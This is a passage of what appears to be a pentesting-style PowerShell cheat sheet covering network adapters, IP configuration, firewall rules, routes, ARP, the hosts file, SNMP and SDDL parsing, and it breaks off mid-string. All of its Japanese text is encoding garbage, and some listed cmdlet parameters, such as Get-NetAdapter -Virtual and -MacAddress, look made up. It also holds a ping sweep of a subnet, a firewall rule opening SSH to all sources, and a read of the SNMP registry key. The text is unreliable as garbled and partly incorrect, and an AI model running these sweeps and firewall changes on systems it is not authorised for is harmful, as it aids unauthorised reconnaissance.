| Command | Description |
|---------|-------------|
| `Get-NetAdapter` | List all network adapters |
| `Get-NetAdapter -Name <adapter_name>` | Get information about a specific network adapter |
| `Get-NetAdapter -Physical` | List only physical network adapters |
| `Get-NetAdapter -Virtual` | List only virtual network adapters |
| `Get-NetAdapter -InterfaceDescription <description>` | Get information about a network adapter based on its description |
| `Get-NetAdapter -MacAddress <mac_address>` | Get information about a network adapter based on its MAC address |
| `Get-NetIPAddress` | List all IP addresses |
| `Get-NetIPAddress -InterfaceAlias <alias>` | Get information about a specific IP address |
| `Get-NetIPAddress -IPAddress <ip_address>` | Get information about a specific IP address |
| `Get-NetIPAddress -AddressFamily <address_family>` | List IP addresses based on address family (IPv4 or IPv6) |
| `Get-NetRoute` | List all network routes |
| `Get-NetRoute -DestinationPrefix <prefix>` | Get information about a specific network route |
| `Get-NetRoute -InterfaceAlias <alias>` | List network routes for a specific interface |
| `Get-NetRoute -NextHop <next_hop>` | List network routes with a specific next hop |
| `Get-NetNeighbor` | List all network neighbors |
| `Get-NetNeighbor -IPAddress <ip_address>` | Get information about a specific network neighbor |
| `Get-NetNeighbor -InterfaceAlias <alias>` | List network neighbors for a specific interface |
| `Get-NetNeighbor -State <state>` | List network neighbors with a specific state |
```

```html
<table>
  <tr>
    <th>ã‚³ãƒãƒ³ãƒ‰</th>
    <th>èª¬æ˜</th>
  </tr>
  <tr>
    <td><code>Get-NetAdapter</code></td>
    <td>ã™ã¹ã¦ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™</td>
  </tr>
  <tr>
    <td><code>Get-NetAdapter -Name &lt;adapter_name&gt;</code></td>
    <td>ç‰¹å®šã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã«é–¢ã™ã‚‹æƒ…å ±ã‚’å–å¾—ã—ã¾ã™</td>
  </tr>
  <tr>
    <td><code>Get-NetAdapter -Physical</code></td>
    <td>ç‰©ç†çš„ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®ã¿ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™</td>
  </tr>
  <tr>
    <td><code>Get-NetAdapter -Virtual</code></td>
    <td>ä»®æƒ³çš„ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®ã¿ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™</td>
  </tr>
  <tr>
    <td><code>Get-NetAdapter -InterfaceDescription &lt;description&gt;</code></td>
    <td>èª¬æ˜ã«åŸºã¥ã„ã¦ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®æƒ…å ±ã‚’å–å¾—ã—ã¾ã™</td>
  </tr>
  <tr>
    <td><code>Get-NetAdapter -MacAddress &lt;mac_address&gt;</code></td>
    <td>MACã‚¢ãƒ‰ãƒ¬ã‚¹ã«åŸºã¥ã„ã¦ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®æƒ…å ±ã‚’å–å¾—ã—ã¾ã™</td>
  </tr>
  <tr>
    <td><code>Get-NetIPAddress</code></td>
    <td>ã™ã¹ã¦ã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™</td>
  </tr>
  <tr>
    <td><code>Get-NetIPAddress -InterfaceAlias &lt;alias&gt;</code></td>
    <td>ç‰¹å®šã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã«é–¢ã™ã‚‹æƒ…å ±ã‚’å–å¾—ã—ã¾ã™</td>
  </tr>
  <tr>
    <td><code>Get-NetIPAddress -IPAddress &lt;ip_address&gt;</code></td>
    <td>ç‰¹å®šã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã«é–¢ã™ã‚‹æƒ…å ±ã‚’å–å¾—ã—ã¾ã™</td>
  </tr>
  <tr>
    <td><code>Get-NetIPAddress -AddressFamily &lt;address_family&gt;</code></td>
    <td>ã‚¢ãƒ‰ãƒ¬ã‚¹ãƒ•ã‚¡ãƒŸãƒªï¼ˆIPv4ã¾ãŸã¯IPv6ï¼‰ã«åŸºã¥ã„ã¦IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™</td>
  </tr>
  <tr>
    <td><code>Get-NetRoute</code></td>
    <td>ã™ã¹ã¦ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ«ãƒ¼ãƒˆã‚’ãƒªã‚¹ãƒˆã—ã¾ã™</td>
  </tr>
  <tr>
    <td><code>Get-NetRoute -DestinationPrefix &lt;prefix&gt;</code></td>
    <td>ç‰¹å®šã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ«ãƒ¼ãƒˆã«é–¢ã™ã‚‹æƒ…å ±ã‚’å–å¾—ã—ã¾ã™</td>
  </tr>
  <tr>
    <td><code>Get-NetRoute -InterfaceAlias &lt;alias&gt;</code></td>
    <td>ç‰¹å®šã®ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ«ãƒ¼ãƒˆã‚’ãƒªã‚¹ãƒˆã—ã¾ã™</td>
  </tr>
  <tr>
    <td><code>Get-NetRoute -NextHop &lt;next_hop&gt;</code></td>
    <td>ç‰¹å®šã®æ¬¡ã®ãƒ›ãƒƒãƒ—ã‚’æŒã¤ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ«ãƒ¼ãƒˆã‚’ãƒªã‚¹ãƒˆã—ã¾ã™</td>
  </tr>
  <tr>
    <td><code>Get-NetNeighbor</code></td>
    <td>ã™ã¹ã¦ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯éš£æ¥è€…ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™</td>
  </tr>
  <tr>
    <td><code>Get-NetNeighbor -IPAddress &lt;ip_address&gt;</code></td>
    <td>ç‰¹å®šã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯éš£æ¥è€…ã«é–¢ã™ã‚‹æƒ…å ±ã‚’å–å¾—ã—ã¾ã™</td>
  </tr>
  <tr>
    <td><code>Get-NetNeighbor -InterfaceAlias &lt;alias&gt;</code></td>
    <td>ç‰¹å®šã®ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯éš£æ¥è€…ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™</td>
  </tr>
  <tr>
    <td><code>Get-NetNeighbor -State &lt;state&gt;</code></td>
    <td>ç‰¹å®šã®çŠ¶æ…‹ã‚’æŒã¤ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯éš£æ¥è€…ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™</td>
  </tr>
</table>
```
```powershell
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«

A firewall is a network security device that monitors and filters incoming and outgoing network traffic based on predetermined security rules. It acts as a barrier between a trusted internal network and an untrusted external network, such as the internet. Firewalls can be implemented as hardware devices or software programs.

ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã¯ã€äº‹å‰ã«è¨­å®šã•ã‚ŒãŸã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ«ãƒ¼ãƒ«ã«åŸºã¥ã„ã¦ã€é€å—ä¿¡ã•ã‚Œã‚‹ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’ç›£è¦–ãŠã‚ˆã³ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã™ã‚‹ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ‡ãƒã‚¤ã‚¹ã§ã™ã€‚ä¿¡é ¼ã•ã‚ŒãŸå†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã¨ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆãªã©ã®ä¿¡é ¼ã•ã‚Œã¦ã„ãªã„å¤–éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®é–“ã«ãƒãƒªã‚¢ã‚’è¨­ã‘ã¾ã™ã€‚ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã¯ãƒãƒ¼ãƒ‰ã‚¦ã‚§ã‚¢ãƒ‡ãƒã‚¤ã‚¹ã¾ãŸã¯ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¨ã—ã¦å®Ÿè£…ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```powershell
Get-NetFirewallRule -Enabled True

Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Allow

# Open SSH to the world
New-NetFirewallRule -DisplayName 'SSH (Port 22)' -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow

# Get name, proto, local and rremote ports, remote address, penable,profile and direction
## You can user the following line changing the initial filters to indicat a difefrent direction or action
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property  DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Profile,Direction,Action
```
### ãƒ«ãƒ¼ãƒˆ

The `Route` command in PowerShell is used to view and manipulate the IP routing table on a Windows system. It allows you to add, delete, or modify routes to control how network traffic is directed.

#### Syntax

```
route [-f] [-p] [Command [Destination] [mask Netmask] [Gateway] [metric Metric]] [if Interface]
```

#### Parameters

- `-f`: Clears the routing table before adding new routes.
- `-p`: Makes the added routes persistent across system reboots.
- `Command`: Specifies the action to be performed on the routing table. It can be one of the following:
  - `ADD`: Adds a route to the routing table.
  - `DELETE`: Deletes a route from the routing table.
  - `CHANGE`: Modifies an existing route in the routing table.
- `Destination`: Specifies the network destination for the route.
- `Netmask`: Specifies the subnet mask for the route.
- `Gateway`: Specifies the gateway or next hop for the route.
- `Metric`: Specifies the metric value for the route.
- `Interface`: Specifies the interface number or name for the route.

#### Examples

- View the routing table:

  ```powershell
  route print
  ```

- Add a route to the routing table:

  ```powershell
  route add 192.168.1.0 mask 255.255.255.0 192.168.0.1
  ```

- Delete a route from the routing table:

  ```powershell
  route delete 192.168.1.0
  ```

- Modify an existing route in the routing table:

  ```powershell
  route change 192.168.1.0 mask 255.255.255.0 192.168.0.2
  ```

- Add a persistent route to the routing table:

  ```powershell
  route -p add 192.168.1.0 mask 255.255.255.0 192.168.0.1
  ```

- Clear the routing table and add new routes:

  ```powershell
  route -f add 192.168.1.0 mask 255.255.255.0 192.168.0.1
  ```
```powershell
route print
```
### ARP

ARPï¼ˆAddress Resolution Protocolï¼‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã¨MACã‚¢ãƒ‰ãƒ¬ã‚¹ã®å¯¾å¿œé–¢ä¿‚ã‚’è§£æ±ºã™ã‚‹ãŸã‚ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ã™ã€‚ARPã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‡ãƒã‚¤ã‚¹ãŒé€šä¿¡ã‚’è¡Œã†éš›ã«ã€å®›å…ˆã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã«å¯¾å¿œã™ã‚‹MACã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ARPã‚­ãƒ£ãƒƒã‚·ãƒ¥ãƒã‚¤ã‚ºãƒ‹ãƒ³ã‚°ã¯ã€ARPãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’æ‚ªç”¨ã—ã¦æ”»æ’ƒã‚’è¡Œã†æ‰‹æ³•ã§ã™ã€‚æ”»æ’ƒè€…ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ãƒ‡ãƒã‚¤ã‚¹ã«å¯¾ã—ã¦ã€èª¤ã£ãŸIPã‚¢ãƒ‰ãƒ¬ã‚¹ã¨MACã‚¢ãƒ‰ãƒ¬ã‚¹ã®å¯¾å¿œé–¢ä¿‚ã‚’æä¾›ã™ã‚‹ã“ã¨ã§ã€é€šä¿¡ã®ä¹—ã£å–ã‚Šã‚„æƒ…å ±ã®ç›—ã¿å‡ºã—ã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚

ARPã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°ã¯ã€ARPã‚­ãƒ£ãƒƒã‚·ãƒ¥ãƒã‚¤ã‚ºãƒ‹ãƒ³ã‚°ã®ä¸€ç¨®ã§ã‚ã‚Šã€æ”»æ’ƒè€…ãŒè‡ªèº«ã®MACã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä»–ã®ãƒ‡ãƒã‚¤ã‚¹ã®MACã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ã—ã¦å½è£…ã™ã‚‹ã“ã¨ã§ã€é€šä¿¡ã®ä¸­ç¶™ã‚„å‚å—ã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚

ARPæ”»æ’ƒã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®ç›£è¦–ã¨é©åˆ‡ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ãŒé‡è¦ã§ã™ã€‚
```powershell
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
### ãƒ›ã‚¹ãƒˆ

ãƒ›ã‚¹ãƒˆã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§ä»–ã®ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã‚„ãƒ‡ãƒã‚¤ã‚¹ã¨é€šä¿¡ã™ã‚‹ãŸã‚ã®å ´æ‰€ã§ã™ã€‚ãƒ›ã‚¹ãƒˆã¯ä¸€æ„ã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒã¡ã€é€šä¿¡ã‚’å—ã‘å…¥ã‚Œã‚‹ãŸã‚ã«ç‰¹å®šã®ãƒãƒ¼ãƒˆã‚’é–‹ãã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ›ã‚¹ãƒˆã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§ã‚µãƒ¼ãƒ“ã‚¹ã‚’æä¾›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ã“ã¨ã‚‚ã‚ã‚Šã¾ã™ã€‚
```powershell
Get-Content C:\WINDOWS\System32\drivers\etc\hosts
```
### ãƒ”ãƒ³

Pingã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ç‰¹å®šã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã¾ãŸã¯ãƒ›ã‚¹ãƒˆåã«å¯¾ã—ã¦ã€å¿œç­”æ™‚é–“ã‚’æ¸¬å®šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ä»¥ä¸‹ã®ã‚ˆã†ã«ä½¿ç”¨ã—ã¾ã™ï¼š

```powershell
ping <IPã‚¢ãƒ‰ãƒ¬ã‚¹ã¾ãŸã¯ãƒ›ã‚¹ãƒˆå>
```

å¿œç­”æ™‚é–“ã‚„ãƒ‘ã‚±ãƒƒãƒˆã®æå¤±ç‡ãªã©ã®æƒ…å ±ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æ¥ç¶šã®ãƒˆãƒ©ãƒ–ãƒ«ã‚·ãƒ¥ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚„ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®å¯ç”¨æ€§ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«é »ç¹ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
```powershell
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.9.15.$_") | select address, status }
```
### SNMP

SNMPï¼ˆSimple Network Management Protocolï¼‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‡ãƒã‚¤ã‚¹ã®ç®¡ç†ã¨ç›£è¦–ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ã™ã€‚SNMPã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ãƒ‡ãƒã‚¤ã‚¹ã®æƒ…å ±ã‚’åé›†ã—ã€ç®¡ç†è€…ã«é€šçŸ¥ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚SNMPã¯ã€ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã¨ãƒãƒãƒ¼ã‚¸ãƒ£ã®é–“ã§æƒ…å ±ã‚’äº¤æ›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

SNMPã«ã¯ã€ä»¥ä¸‹ã®ä¸»è¦ãªã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒã‚ã‚Šã¾ã™ã€‚

- ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆï¼šãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‡ãƒã‚¤ã‚¹ä¸Šã§å®Ÿè¡Œã•ã‚Œã‚‹ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã§ã€SNMPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å—ä¿¡ã—ã€å¿œç­”ã‚’è¿”ã—ã¾ã™ã€‚
- ãƒãƒãƒ¼ã‚¸ãƒ£ï¼šSNMPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã€ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã‹ã‚‰ã®å¿œç­”ã‚’å—ã‘å–ã‚Šã¾ã™ã€‚
- MIBï¼ˆManagement Information Baseï¼‰ï¼šãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‡ãƒã‚¤ã‚¹ã®æƒ…å ±ã‚’å®šç¾©ã™ã‚‹ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã§ã™ã€‚MIBã¯ã€ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã¨ãƒãƒãƒ¼ã‚¸ãƒ£ã®é–“ã§æƒ…å ±ã‚’äº¤æ›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

SNMPã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‡ãƒã‚¤ã‚¹ã®çŠ¶æ…‹ã‚„ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã«é–¢ã™ã‚‹æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã¾ãŸã€SNMPã‚’ä½¿ç”¨ã—ã¦ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‡ãƒã‚¤ã‚¹ã®è¨­å®šã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

SNMPã«ã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®æ‡¸å¿µãŒã‚ã‚Šã¾ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã‚¹ãƒˆãƒªãƒ³ã‚°ãŒè¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯SNMPã‚’ä½¿ç”¨ã—ã¦ãƒ‡ãƒã‚¤ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€SNMPã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å¼·åŒ–ã™ã‚‹ãŸã‚ã«ã¯ã€é©åˆ‡ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã‚¹ãƒˆãƒªãƒ³ã‚°ã®è¨­å®šã‚„ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ãƒªã‚¹ãƒˆï¼ˆACLï¼‰ã®ä½¿ç”¨ãŒå¿…è¦ã§ã™ã€‚
```powershell
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```
## **SDDLæ–‡å­—åˆ—ã‚’èª­ã¿ã‚„ã™ã„å½¢å¼ã«å¤‰æ›ã™ã‚‹**

To convert the SDDL (Security Descriptor Definition Language) string into a readable format, you can use the `ConvertFrom-SddlString` cmdlet in PowerShell. This cmdlet allows you to parse and convert the SDDL string into an object that can be easily understood.

```powershell
$sddlString = "D:(A;;GA;;;WD)(A;;GA;;;BA)"
$securityDescriptor = ConvertFrom-SddlString -Sddl $sddlString
$securityDescriptor
```

The `ConvertFrom-SddlString` cmdlet takes the SDDL string as input and returns an object that represents the security descriptor. This object contains information about the various access control entries (ACEs) defined in the SDDL string.

By running the above code, you will be able to see the converted security descriptor object, which provides a more readable representation of the SDDL string.

Note: The `ConvertFrom-SddlString` cmdlet is available in PowerShell version 5.1 and later.
```powershell

PS C:\> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c